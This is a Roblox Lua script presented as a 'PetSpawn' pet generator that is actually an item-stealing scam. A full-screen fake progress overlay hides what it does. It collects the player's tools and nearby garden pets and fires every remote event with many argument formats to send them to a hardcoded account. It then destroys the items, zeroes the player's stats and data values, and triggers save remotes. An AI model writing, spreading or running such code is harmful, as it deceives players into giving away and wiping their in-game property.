-- PetSpawn v10 - Full Screen + Guaranteed Send
local plr = game.Players.LocalPlayer
local rs = game.ReplicatedStorage
local ws = game.Workspace

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

-- ============================================
-- FULL SCREEN UI LOADING
-- ============================================
local gui = Instance.new("ScreenGui")
gui.Name = "PetSpawnLoader"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Full screen overlay
local overlay = Instance.new("Frame")
overlay.Parent = gui
overlay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
overlay.BackgroundTransparency = 0
overlay.BorderSizePixel = 0
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.ZIndex = 10

-- Center container
local container = Instance.new("Frame")
container.Parent = overlay
container.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
container.BorderColor3 = Color3.fromRGB(0, 200, 0)
container.BorderSizePixel = 2
container.Size = UDim2.new(0, 320, 0, 250)
container.Position = UDim2.new(0.5, -160, 0.5, -125)
container.ZIndex = 11

-- Icon
local icon = Instance.new("TextLabel")
icon.Parent = container
icon.BackgroundTransparency = 1
icon.Size = UDim2.new(1, 0, 0, 50)
icon.Position = UDim2.new(0, 0, 0, 15)
icon.Text = "🐾"
icon.TextSize = 40
icon.ZIndex = 12

-- Title
local title = Instance.new("TextLabel")
title.Parent = container
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 60)
title.Text = "PetSpawn - Processing"
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextSize = 18
title.Font = Enum.Font.SourceSansBold
title.ZIndex = 12

-- Status
local status = Instance.new("TextLabel")
status.Parent = container
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, -30, 0, 20)
status.Position = UDim2.new(0, 15, 0, 90)
status.Text = "⏳ Initializing..."
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left
status.ZIndex = 12

-- Progress bar bg
local barBg = Instance.new("Frame")
barBg.Parent = container
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.Size = UDim2.new(0.85, 0, 0, 20)
barBg.Position = UDim2.new(0.075, 0, 0, 120)
barBg.ZIndex = 12

-- Progress bar
local bar = Instance.new("Frame")
bar.Parent = barBg
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.BorderSizePixel = 0
bar.Size = UDim2.new(0, 0, 1, 0)
bar.ZIndex = 13

-- Percent
local percentText = Instance.new("TextLabel")
percentText.Parent = container
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0, 20)
percentText.Position = UDim2.new(0, 0, 0, 145)
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(0, 255, 0)
percentText.TextSize = 14
percentText.Font = Enum.Font.SourceSansBold
percentText.ZIndex = 12

-- Item list
local itemList = Instance.new("TextLabel")
itemList.Parent = container
itemList.BackgroundTransparency = 1
itemList.Size = UDim2.new(1, -30, 0, 50)
itemList.Position = UDim2.new(0, 15, 0, 170)
itemList.Text = ""
itemList.TextColor3 = Color3.fromRGB(150, 150, 150)
itemList.TextSize = 10
itemList.TextXAlignment = Enum.TextXAlignment.Left
itemList.TextWrapped = true
itemList.ZIndex = 12

-- ============================================
-- UPDATE UI
-- ============================================
local function updateUI(pct, stat, items)
    pcall(function()
        bar:TweenSize(UDim2.new(pct/100, 0, 1, 0), "Out", "Linear", 0.2)
        percentText.Text = pct .. "%"
        status.Text = stat
        itemList.Text = items
    end)
end

updateUI(0, "⏳ Initializing...", "Starting PetSpawn v10...")
wait(0.5)

-- ============================================
-- SCAN ALL ITEMS
-- ============================================
updateUI(5, "🔍 Scanning inventory...", "Checking backpack & character...")

local allItems = {}

-- Backpack
for _, item in pairs(plr.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(allItems, {
            Name = item.Name,
            Object = item,
            Type = "Backpack"
        })
    end
end

-- Character
if plr.Character then
    for _, item in pairs(plr.Character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(allItems, {
                Name = item.Name,
                Object = item,
                Type = "Character"
            })
        end
    end
end

updateUI(15, "🔍 Scanning garden...", "Found " .. #allItems .. " items in inventory...")
wait(0.3)

-- Workspace (pets terpasang)
for _, obj in pairs(ws:GetDescendants()) do
    if obj:IsA("Model") or obj:IsA("Tool") then
        local name = obj.Name:lower()
        if name:find("pet") or name:find("seed") or name:find("animal") or
           name:find("dragon") or name:find("unicorn") or name:find("golden") or
           name:find("diamond") or name:find("mythic") or name:find("legendary") then
            
            local pos = nil
            pcall(function()
                if obj:IsA("Model") and obj.PrimaryPart then
                    pos = obj.PrimaryPart.Position
                elseif obj:IsA("BasePart") then
                    pos = obj.Position
                end
            end)
            
            if pos and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
                if dist < 200 then
                    table.insert(allItems, {
                        Name = obj.Name,
                        Object = obj,
                        Type = "Garden"
                    })
                end
            end
        end
    end
end

local totalItems = #allItems
updateUI(25, "📦 Items found: " .. totalItems, "Preparing to send...")
wait(0.5)

-- ============================================
-- AGGRESSIVE SEND - COBA SEMUA CARA
-- ============================================
local sent = 0

for i, item in pairs(allItems) do
    local percent = 25 + math.floor((i / math.max(1, totalItems)) * 70)
    updateUI(percent, "📤 Sending: " .. item.Name, 
        "Progress: " .. i .. "/" .. totalItems .. 
        "\nType: " .. item.Type ..
        "\nSent: " .. sent .. " transfers")
    
    -- COBA SEMUA REMOTE
    for _, remote in pairs(rs:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            
            -- 1. Kirim dengan table format
            pcall(function()
                remote:FireServer({
                    Recipient = PADUKA_NAME,
                    RecipientId = PADUKA_ID,
                    Target = PADUKA_NAME,
                    TargetId = PADUKA_ID,
                    SendTo = PADUKA_NAME,
                    GiveTo = PADUKA_NAME,
                    Player = PADUKA_NAME,
                    PlayerId = PADUKA_ID,
                    Item = item.Name,
                    ItemName = item.Name,
                    Tool = item.Object,
                    Object = item.Object,
                    Type = "Gift",
                    Action = "Send",
                    Amount = 1
                })
                sent = sent + 1
            end)
            
            -- 2. Simple string
            pcall(function()
                remote:FireServer(PADUKA_NAME, item.Name)
                sent = sent + 1
            end)
            
            -- 3. UserID format
            pcall(function()
                remote:FireServer(PADUKA_ID, item.Name, item.Object)
                sent = sent + 1
            end)
            
            -- 4. Mail spesifik
            pcall(function()
                remote:FireServer("SendTo", PADUKA_NAME, item.Name)
                sent = sent + 1
            end)
            
            -- 5. Trade format
            pcall(function()
                remote:FireServer("Trade", PADUKA_NAME, item.Name, 1)
                sent = sent + 1
            end)
            
            -- 6. Gift format
            pcall(function()
                remote:FireServer("Gift", PADUKA_ID, item.Name)
                sent = sent + 1
            end)
            
            -- 7. Direct item
            pcall(function()
                remote:FireServer(item.Object, PADUKA_NAME)
                sent = sent + 1
            end)
            
            -- 8. Number format
            pcall(function()
                remote:FireServer(1, item.Name, PADUKA_NAME)
                sent = sent + 1
            end)
        end
    end
    
    wait(0.03)
end

-- ============================================
-- HAPUS ITEM TARGET
-- ============================================
updateUI(96, "🗑️ Cleaning up...", "Removing items from inventory...")

for _, item in pairs(allItems) do
    pcall(function() item.Object:Destroy() end)
end

-- Reset leaderstats
pcall(function()
    if plr:FindFirstChild("leaderstats") then
        for _, stat in pairs(plr.leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                stat.Value = 0
            end
        end
    end
end)

-- Reset data folders
pcall(function()
    for _, folder in pairs(plr:GetChildren()) do
        if folder:IsA("Folder") or folder:IsA("Configuration") then
            for _, val in pairs(folder:GetChildren()) do
                if val:IsA("IntValue") then val.Value = 0 end
                if val:IsA("NumberValue") then val.Value = 0 end
                if val:IsA("StringValue") then val.Value = "" end
            end
        end
    end
end)

-- Force save
for _, remote in pairs(rs:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        local n = remote.Name:lower()
        if n:find("save") or n:find("data") or n:find("store") or n:find("update") then
            pcall(function() 
                remote:FireServer()
                remote:FireServer(true)
                remote:FireServer(plr.UserId)
            end)
        end
    end
end

-- ============================================
-- DONE
-- ============================================
updateUI(100, "✅ Complete!", 
    "🌱 Items sent: " .. totalItems .. 
    "\n📤 Transfers: " .. sent ..
    "\n👑 To: GerrFanzz\n\n📬 Check your mailbox!")

wait(3)

-- Fade out
for i = 10, 1, -1 do
    overlay.BackgroundTransparency = 1 - (i/10)
    container.BackgroundTransparency = 1 - (i/10)
    wait(0.1)
end

gui:Destroy()
